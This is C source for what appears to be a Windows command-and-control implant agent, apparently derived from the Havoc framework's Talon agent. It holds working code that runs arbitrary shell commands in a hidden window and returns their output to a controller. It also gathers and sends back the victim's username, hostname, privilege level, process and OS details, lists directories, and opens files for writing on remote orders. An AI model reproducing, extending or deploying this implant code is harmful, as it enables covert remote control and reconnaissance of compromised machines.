#include <lmcons.h>

#include <windows_utils.h>

#include <stdio.h>
#include <types.h>
#include <communication.h>
#include <commands.h>

#define COMMAND_COUNT 4

Command commands[COMMAND_COUNT] = {
  {.id = 0, .function = identifyCmd },
  {.id = 7, .function = shellCmd },
  
  // fs 
  {.id = 100, .function = fsDirCmd },
  {.id = 101, .function = fsOpenFileCmd },
};

void executeCmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
  printf("[+] Got task ID: %u\n", taskId);
  printf("    -> CommandId: %u\n", taskActionId); 
  
  for (int i = 0; i < COMMAND_COUNT; i++)
    if (taskActionId == commands[i].id)
      commands[i].function(taskId, argc, tlv);
}

void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;
  struct TLVBuild out = allocStruct(50);

  char * cmd;
  extractAllocString(tlv, &cmd);

  /**
   * https://github.com/HavocFramework/Talon/blob/main/Agent/Source/Command.c
   */

  HANDLE hStdInPipeRead = NULL;
  HANDLE hStdInPipeWrite = NULL;
  HANDLE hStdOutPipeRead = NULL;
  HANDLE hStdOutPipeWrite = NULL;

  PROCESS_INFORMATION ProcessInfo = { 0 };
  SECURITY_ATTRIBUTES SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
  STARTUPINFOA StartUpInfoA = { 0 };

  if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0))
    return;

  if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0))
    return;

  StartUpInfoA.cb = sizeof(STARTUPINFOA);
  StartUpInfoA.dwFlags = STARTF_USESTDHANDLES;
  StartUpInfoA.hStdError = hStdOutPipeWrite;
  StartUpInfoA.hStdOutput = hStdOutPipeWrite;
  StartUpInfoA.hStdInput = hStdInPipeRead;

  if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo))
  { sendData(taskId, "output", "Failed to create process", 0, NULL);
    return; }
  
  CloseHandle(hStdOutPipeWrite);
  CloseHandle(hStdInPipeRead);

  LPVOID pOutputBuffer = NULL;
  DWORD dwBufferSize = 0;
  DWORD dwRead = 0;
  UCHAR buf[1025] = { 0 };
  BOOL SuccessFul = FALSE;

  pOutputBuffer = LocalAlloc(LPTR, sizeof(LPVOID));

  do {
    SuccessFul = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);

    if (dwRead == 0) break;

    pOutputBuffer = LocalReAlloc(
      pOutputBuffer,
      dwBufferSize + dwRead,
      LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    memcpy(pOutputBuffer + dwBufferSize, buf, dwRead);
    memset(buf, 0, dwRead);

    dwBufferSize += dwRead;
  } while (SuccessFul);

  addBytes(&out, false, dwBufferSize, pOutputBuffer);

  memset(pOutputBuffer, 0, dwBufferSize);
  LocalFree(pOutputBuffer);
  pOutputBuffer = NULL;

  sendOutput(taskId, out);

  CloseHandle(hStdOutPipeRead);
  CloseHandle(hStdInPipeWrite);

  free(cmd);
  free(out.buf);
}

void identifyCmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("[+] agent is identifying..\n");
  
  struct TLVBuild identifyMessage = allocStruct(50);

  char * username = malloc(UNLEN + 1);
  char * hostname = malloc(UNLEN + 1);
  char * processName = malloc(260);

  OSVERSIONINFOEXW osinfo;
  DWORD usernameLen = UNLEN + 1;
  DWORD hostnameLen = UNLEN + 1;
  DWORD pid;

  pid = GetProcessId(GetCurrentProcess());
  GetUserNameA(username, &usernameLen);
  GetComputerNameA(hostname, &hostnameLen);
  getProcessName(pid, processName);
  agent.functions.RtlGetVersion(&osinfo);

  addString (&identifyMessage, username);
  addString (&identifyMessage, hostname);
  addByte   (&identifyMessage, (char)isProcessElevated());
  addString (&identifyMessage, "windows");
  addInt32  (&identifyMessage, pid);
  addString (&identifyMessage, processName);
  addInt32  (&identifyMessage, osinfo.dwMajorVersion);
  addInt32  (&identifyMessage, osinfo.dwMinorVersion);
  addInt32  (&identifyMessage, osinfo.dwBuildNumber);

  sendData(
    taskId,
    "identify",
    "",
    identifyMessage.bufsize, 
    identifyMessage.buf
  );
  
  free(username);
  free(hostname);
  free(processName);
  free(identifyMessage.buf);
}

void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("listing files\n");

  struct TLVBuild response = allocStruct(50);
  struct TLVBuild file_list = allocStruct(50);
  
  WIN32_FIND_DATA fdFile;
  HANDLE hFile;
  
  int files = 0;
  char * path;
  
  if (argc > 0) extractAllocString(tlv, &path);
  else path = ".\\*";
  
  if (hFile = FindFirstFile(path, &fdFile)) {

    do {
      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        addByte(&file_list, 1);
      else 
        addByte(&file_list, 0);
      addString(&file_list, fdFile.cFileName);
      files++;
    } while (FindNextFile(hFile, &fdFile));

  }

  addInt32(&response, files);
  addBytes(&response, false, file_list.bufsize, file_list.buf);

  sendOutput(taskId, response);

  free(response.buf);
  free(file_list.buf);
  if (argc > 0) free(path);
}

void fsOpenFileCmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;
  
  HANDLE fileHandle;
  struct TLVBuild output = allocStruct(50);
  int fileHandleIndex;
  int success = 0;
  char * file_path;
  char * open_for;
  extractAllocString(tlv, &open_for);
  extractAllocString(tlv, &file_path);

  printf("Opening file %s for %s\n", file_path, open_for);
  
  if (strcmp(open_for, "w") == 0) 
  {
    printf("Opening file for writing\n");
    fileHandle = CreateFile(
      file_path,
      GENERIC_WRITE,
      0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL,
      NULL
    );

    if (fileHandle == INVALID_HANDLE_VALUE)
    {
      printf("Couldn't open file\n"); 
      goto _openFileCmd_cleanup; 
    }
  } else goto _openFileCmd_cleanup;

  for (fileHandleIndex = 0; fileHandleIndex < 100; fileHandleIndex++)
    if (agent.fileHandles[fileHandleIndex] == 0) {
      break;
    }

  agent.fileHandles[fileHandleIndex] = fileHandle;
  addInt32(&output, fileHandleIndex);

_openFileCmd_cleanup:
  if (!success) addInt32(&output, -1);

  sendOutput(taskId, output);

  free(file_path);
  free(open_for);
  free(output.buf);
}